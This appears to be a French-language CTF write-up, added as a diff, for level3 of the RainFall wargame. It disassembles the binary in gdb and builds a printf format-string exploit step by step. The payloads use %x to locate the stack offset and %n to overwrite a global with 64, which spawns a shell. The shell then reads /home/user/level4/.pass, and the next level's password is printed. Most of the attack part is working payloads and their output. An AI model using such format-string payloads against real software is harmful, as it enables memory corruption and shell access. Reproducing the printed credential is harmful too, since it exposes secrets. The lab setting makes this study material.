@@ -1,0 +1,87 @@
+ls -la
+level3
+quand on lance ./level3
+pareil que le level2
+
+
+info function
+0x080484a4  v
+0x0804851a  main
+
+(gdb) disas main
+0x08048520 <+6>:     call   0x80484a4 <v>
+
+(gdb) disas v
+0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
+0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+0x080484e2 <+62>:    jne    0x8048518 <v+116>
+0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
+0x08048513 <+111>:   call   0x80483c0 <system@plt>
+
+on peut voir qu'il y a un jump qui nous permet de lancer le /bin/sh
+pour y arriver il faut cmp
+0x080484df <+59>:    cmp    $0x40,%eax        0x40 = 64
+il faut que eax soit a 64
+
+j'ai regarder et fgets et plus secure que gets donc il faut penser a autre chose la seul chose qui me vient a l'idee c jouer sur le printf
+
+j'ai essayer de le run
+r <<< "..... %i %i %i"
+..... 512 -1208149312 -1208010800
+
+du coup je fais plein de test et je vois qu'avec les x on a les hexa logique printf %x = hexa 
+
+r <<< "..... %x %x %x %x"
+..... 200 b7fd1ac0 b7ff37d0 2e2e2e2e 
+du coup j'ai chercher et enfaite toute c valeur sont des adresse sur la stack donc on peut meme voir directement que notre valeur de printf et la 4
+donc on va pouvoir jouer avec ca on va voir si ca marche vraiment
+
+
+je prend la valeur apres printf 0x804988c qui donne \x8c\x98\x04\x08
+r <<< "\x8c\x98\x04\x08 %x %x %x %x"
+ca ne donne rien de fou je vais chercher comment faire
+je tombe sur une video parfaite 
+https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=22
+
+du coup je suis la video
+python -c "print 'AAAA' + '%x '*10" | ./level3 
+AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520 
+on revoit que notre printf et sur le 4 eme arg
+
+ensuite il parle d'une technique de manipulation de variable avec %n
+du coup on change l'adresse par ce qu'on veut soit la valeur apres printf
+0x804988c qui donne \x8c\x98\x04\x08
+python -c "print 'AAAA' + '\x8c\x98\x04\x08' + 'BBBB' + '%x '*10" | ./level3 
+on voit vien qu'on a changer et entourer la bonne valeur 
+AAAA�BBBB200 b7fd1ac0 b7ff37d0 41414141 804988c 42424242 25207825 78252078 20782520 25207825 
+41414141 804988c 42424242
+
+maintenant il faut que le dernier %x soit notre reference
+level3@RainFall:~$ python -c "print 'AAAA' + '\x8c\x98\x04\x08' + '%x '*4 + '%x'" | ./level3 
+AAAA�BBBB200 b7fd1ac0 b7ff37d0 41414141 804988c
+
+maintenant on va essayer de modifier la target avec le %n
+OK OK OK bon j'ai trouver un truc plutot sympa apres le printf y a ca
+0x080484df <+59>:    cmp    $0x40,%eax
+
+je suis con il faut donc que la valeur modifier soit == a 0x40 soit 64
+donc il faut calculer le nombre caractere lue par %n et lui ajouter le reste
+python -c "print 'AAAA' + '\x8c\x98\x04\x08' + '%x '*4  +'A'*25 + '%n'"| ./level3
+apres moulte calcule j'ai trouver on fait donc 
+AAAA200b7fd1ac0b7ff37d0414141418c980408 = 39 caractere + 25 et hop on tombe sur 64 plus cas envoyer ca dans le %n
+									39 caractere		+ 25	dans %n
+python -c "print 'AAAA' + '\x8c\x98\x04\x08' + '%x '*4  +'A'*25 + '%n'"| ./level3
+on lance et hop
+level3@RainFall:~$ python -c "print 'AAAA' + '\x8c\x98\x04\x08' + '%x '*4  +'A'*25 + '%n'"| ./level3
+AAAA�200 b7fd1ac0 b7ff37d0 41414141 AAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+
+on a wait what
+plus cas le relancer avec le cat comme a l'exo d'avent
+(python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*4  +'A'*25 + '%n')" ; cat -)| ./level3
+
+level3@RainFall:~$ (python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*4  +'A'*25 + '%n')" ; cat -)| ./level3
+AAAA�200 b7fd1ac0 b7ff37d0 41414141 AAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
